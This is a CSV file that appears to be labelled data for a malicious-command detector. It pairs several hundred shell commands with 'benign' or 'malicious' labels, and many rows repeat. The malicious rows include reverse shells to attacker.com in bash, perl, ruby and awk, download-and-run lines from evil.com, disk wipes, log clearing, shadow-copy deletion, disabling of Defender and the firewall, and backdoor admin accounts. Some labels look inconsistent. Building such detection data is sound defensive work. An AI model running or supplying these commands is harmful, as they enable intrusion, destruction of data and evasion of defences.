command,label
"python -c 'import os; os.system(""rm -rf /"")'",malicious
attrib +h +s malware.exe &,malicious
echo 'Hello World',benign
useradd newuser,benign
wc -l document.txt --help,benign
git clone https://github.com/user/repo.git -v,benign
head -10 logfile.txt,benign
rm -rf /,malicious
(attrib +h +s malware.exe),malicious
cp file1.txt file2.txt > output.txt,benign
wmic process call create 'cmd.exe /c powershell.exe' &,malicious
who,benign
free -m,benign
sudo cat /etc/passwd,benign
mkfs.ext4 /dev/sda1 2>&1,malicious
chmod 777 /etc/shadow,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
sed 's/old/new/g' file.txt,benign
rsync -av /src/ /dst/,benign
mv old.txt new.txt,benign
wevtutil cl Security,malicious
npm list 2>/dev/null,benign
chmod 777 /etc/shadow,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
last,benign
dd if=/dev/zero of=/dev/sda,malicious
mshta javascript:alert('code execution'),malicious
passwd user > output.txt,benign
type ls,benign
docker images --help,benign
chmod 777 /etc/shadow >/dev/null,malicious
git clone https://github.com/user/repo.git > output.txt,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
umount /dev/sdb1,benign
chmod 777 /etc/shadow,malicious
curl -I https://google.com,benign
echo 'virus' > /etc/passwd,malicious
dd if=/dev/zero of=/dev/sda,malicious
"cut -d',' -f1 data.csv",benign
wevtutil cl Security,malicious
ssh user@server.com,benign
iptables -L -v,benign
timeout 60 mkfs.ext4 /dev/sda1,malicious
timeout 60 format C: /q /x,malicious
wmic process call create 'cmd.exe /c powershell.exe' 2>&1,malicious
sort data.txt | head -5,benign
service apache2 status,benign
nohup chmod 777 /etc/shadow,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
ncat -lvp 443 -e cmd.exe,malicious
kubectl get pods --help,benign
sdelete -p 10 -s -z C:\,malicious
node --version,benign
passwd user,benign
git clone https://github.com/user/repo.git 2>/dev/null,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' 2>&1",malicious
:(){ :|:& };:,malicious
man ls,benign
(bcdedit /set {default} bootstatuspolicy ignoreallfailures),malicious
mv old.txt new.txt,benign
cat /dev/urandom > /dev/sda,malicious
sort data.txt,benign
nslookup google.com,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
timeout 60 python -m http.server 8080,malicious
top > output.txt,benign
echo 'Hello World' -v,benign
type ls,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
format C: /q /x,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
mshta javascript:alert('code execution') 2>&1,malicious
mshta javascript:alert('code execution'),malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
wevtutil cl Security >/dev/null,malicious
crontab -l,benign
echo 'Hello World',benign
touch newfile.txt,benign
free -m,benign
du -sh /var/log,benign
yum list installed,benign
nohup curl http://evil.com/payload.sh | bash,malicious
python -m http.server 8080,malicious
ls -la -v,benign
lsblk,benign
diskpart select disk 0 clean,malicious
vmstat 2>/dev/null,benign
curl http://evil.com/payload.sh | bash,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
finger user > output.txt,benign
rm -rf / &,malicious
useradd newuser,benign
python -m http.server 8080,malicious
timeout 60 mshta javascript:alert('code execution'),malicious
awk '{print $1}' data.txt,benign
du -sh /var/log,benign
sdelete -p 10 -s -z C:\,malicious
vmstat,benign
find /home -name '*.txt' | head -5,benign
vmstat 2>/dev/null,benign
yum list installed -v,benign
finger user,benign
umount /dev/sdb1,benign
whoami,benign
chown user:group file.txt,benign
netstat -tulpn > output.txt,benign
nohup vssadmin delete shadows /all /quiet,malicious
attrib +h +s malware.exe,malicious
mshta javascript:alert('code execution'),malicious
userdel olduser | head -5,benign
"timeout 60 ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
last -v,benign
wevtutil cl Security &,malicious
curl http://evil.com/payload.sh | bash,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
ss -tulpn 2>/dev/null,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
ls -la > output.txt,benign
cipher /w:C:\,malicious
attrib +h +s malware.exe,malicious
format C: /q /x,malicious
nohup cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
umount /dev/sdb1,benign
cat /dev/urandom > /dev/sda 2>&1,malicious
python --version,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>&1,malicious
find /home -name '*.txt',benign
curl http://evil.com/payload.sh | bash,malicious
finger user,benign
cp file1.txt file2.txt,benign
ssh user@server.com,benign
echo 'Hello World',benign
ssh user@server.com,benign
rmdir empty_folder,benign
diskpart select disk 0 clean,malicious
(ncat -lvp 443 -e cmd.exe),malicious
(ncat -lvp 443 -e cmd.exe),malicious
python --version,benign
rm -rf /,malicious
cat /dev/urandom > /dev/sda,malicious
pip list --help,benign
cp file1.txt file2.txt,benign
grep pattern file.txt,benign
net user hacker password123 /add,malicious
ss -tulpn,benign
sc stop Windows Defender,malicious
finger user,benign
git pull origin main,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
which python,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
df -h | head -5,benign
htop,benign
df -h,benign
fdisk -l,benign
mshta javascript:alert('code execution') >/dev/null,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
usermod -aG sudo user,benign
taskkill /f /im antimalware.exe,malicious
find /home -name '*.txt',benign
netsh advfirewall set allprofiles state off &,malicious
systemctl status nginx,benign
docker ps,benign
vmstat,benign
net localgroup administrators hacker /add,malicious
wevtutil cl System,malicious
sc stop Windows Defender,malicious
type ls | head -5,benign
service apache2 status,benign
netsh advfirewall set allprofiles state off,malicious
attrib +h +s malware.exe,malicious
nslookup google.com,benign
nohup net localgroup administrators hacker /add,malicious
attrib +h +s malware.exe,malicious
grep pattern file.txt,benign
rm -rf /,malicious
usermod -aG sudo user,benign
netsh advfirewall set allprofiles state off,malicious
wget https://example.com/file.txt,benign
yum list installed,benign
whoami,benign
nohup shutdown /r /f /t 0,malicious
"(ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)')",malicious
python --version,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
curl -I https://google.com | head -5,benign
cat /dev/urandom > /dev/sda,malicious
cipher /w:C:\,malicious
cipher /w:C:\ &,malicious
ping -c 4 google.com > output.txt,benign
du -sh /var/log,benign
cipher /w:C:\,malicious
service apache2 status,benign
pip list,benign
du -sh /var/log,benign
useradd newuser,benign
usermod -aG sudo user,benign
wc -l document.txt,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe 2>&1,malicious
cat /etc/passwd,benign
python --version,benign
netsh advfirewall set allprofiles state off,malicious
rsync -av /src/ /dst/ | head -5,benign
mkfs.ext4 /dev/sda1,malicious
passwd user,benign
pwd,benign
timeout 60 bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
attrib +h +s malware.exe,malicious
wevtutil cl System 2>&1,malicious
echo 'Hello World',benign
"(perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");')",malicious
wc -l document.txt,benign
cmd /c del /q /s C:\*,malicious
kubectl get pods > output.txt,benign
(netsh advfirewall set allprofiles state off),malicious
taskkill /f /im antimalware.exe,malicious
"cut -d',' -f1 data.csv",benign
sdelete -p 10 -s -z C:\,malicious
systemctl status nginx,benign
curl http://evil.com/payload.sh | bash &,malicious
rm -rf /,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
pwd,benign
python -m http.server 8080 &,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash 2>&1",malicious
sed 's/old/new/g' file.txt,benign
fdisk -l,benign
which python -v,benign
history,benign
netsh advfirewall set allprofiles state off,malicious
top 2>/dev/null,benign
node --version,benign
pwd,benign
npm list -v,benign
cat /dev/urandom > /dev/sda,malicious
chown user:group file.txt,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
rsync -av /src/ /dst/,benign
last,benign
awk '{print $1}' data.txt,benign
sort data.txt --help,benign
nohup bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
(diskpart select disk 0 clean),malicious
java -version,benign
fdisk -l | head -5,benign
type ls,benign
ssh user@server.com -v,benign
sudo man ls,benign
java -version -v,benign
docker ps,benign
dd if=/dev/zero of=/dev/sda,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
systemctl status nginx | head -5,benign
ls -la,benign
echo 'virus' > /etc/passwd,malicious
ping -c 4 google.com 2>/dev/null,benign
nc -l -p 4444 -e /bin/bash,malicious
(wevtutil cl Security),malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
cmd /c del /q /s C:\*,malicious
wc -l document.txt 2>/dev/null,benign
python -m http.server 8080,malicious
wevtutil cl System 2>&1,malicious
net localgroup administrators hacker /add,malicious
timeout 60 curl http://evil.com/payload.sh | bash,malicious
"cut -d',' -f1 data.csv",benign
vmstat,benign
nslookup google.com,benign
java -version,benign
usermod -aG sudo user,benign
cipher /w:C:\,malicious
iostat,benign
echo 'Hello World',benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe >/dev/null,malicious
umount /dev/sdb1,benign
ncat -lvp 443 -e cmd.exe,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
cp file1.txt file2.txt,benign
(ncat -lvp 443 -e cmd.exe),malicious
wget https://example.com/file.txt --help,benign
npm list,benign
attrib +h +s malware.exe,malicious
systemctl reload nginx,benign
shutdown /r /f /t 0,malicious
chmod 777 /etc/shadow,malicious
(reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe),malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe >/dev/null,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe >/dev/null,malicious
(python -m http.server 8080),malicious
java -version,benign
crontab -l,benign
java -version,benign
tail -f /var/log/syslog,benign
nslookup google.com,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
git clone https://github.com/user/repo.git,benign
systemctl reload nginx,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
ls -la,benign
lsblk --help,benign
whoami --help,benign
chown user:group file.txt,benign
userdel olduser,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
service apache2 status > output.txt,benign
ssh user@server.com,benign
finger user,benign
passwd user 2>/dev/null,benign
shutdown /r /f /t 0,malicious
python -m http.server 8080,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' >/dev/null",malicious
systemctl reload nginx,benign
systemctl reload nginx,benign
nohup nc -l -p 4444 -e /bin/bash,malicious
touch newfile.txt,benign
"timeout 60 rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
who,benign
ncat -lvp 443 -e cmd.exe 2>&1,malicious
diskpart select disk 0 clean,malicious
ping -c 4 google.com,benign
timeout 60 wevtutil cl System,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
format C: /q /x,malicious
diskpart select disk 0 clean,malicious
systemctl status nginx,benign
wget http://malicious.com/malware.exe,malicious
ncat -lvp 443 -e cmd.exe,malicious
node --version,benign
mkdir -p /tmp/test,benign
grep pattern file.txt,benign
mkfs.ext4 /dev/sda1,malicious
wget http://malicious.com/malware.exe &,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
(chmod 777 /etc/shadow),malicious
useradd newuser,benign
nohup net user hacker password123 /add,malicious
"(perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");')",malicious
cipher /w:C:\,malicious
taskkill /f /im antimalware.exe,malicious
touch newfile.txt --help,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
cipher /w:C:\,malicious
fdisk -l --help,benign
curl http://evil.com/payload.sh | bash,malicious
timeout 60 echo 'virus' > /etc/passwd,malicious
free -m,benign
htop,benign
ncat -lvp 443 -e cmd.exe,malicious
free -m,benign
dd if=/dev/zero of=/dev/sda,malicious
net localgroup administrators hacker /add >/dev/null,malicious
wget http://malicious.com/malware.exe,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
groups user -v,benign
wget https://example.com/file.txt,benign
dd if=/dev/zero of=/dev/sda,malicious
apt list --installed,benign
dd if=/dev/zero of=/dev/sda,malicious
docker ps,benign
nc -l -p 4444 -e /bin/bash >/dev/null,malicious
mshta javascript:alert('code execution'),malicious
which python -v,benign
date,benign
docker images,benign
ls -la,benign
which python | head -5,benign
free -m,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
passwd user | head -5,benign
iptables -L,benign
wc -l document.txt,benign
ssh user@server.com --help,benign
ufw status,benign
sc stop Windows Defender,malicious
java -version 2>/dev/null,benign
sc stop Windows Defender &,malicious
vssadmin delete shadows /all /quiet,malicious
grep pattern file.txt,benign
wevtutil cl Security &,malicious
useradd newuser,benign
wget http://malicious.com/malware.exe,malicious
curl -I https://google.com 2>/dev/null,benign
echo 'virus' > /etc/passwd,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
npm list --help,benign
npm list,benign
diskpart select disk 0 clean,malicious
vmstat,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
touch newfile.txt,benign
format C: /q /x 2>&1,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' 2>&1",malicious
sudo wc -l document.txt,benign
sed 's/old/new/g' file.txt,benign
man ls,benign
"nohup powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
sed 's/old/new/g' file.txt,benign
(taskkill /f /im antimalware.exe),malicious
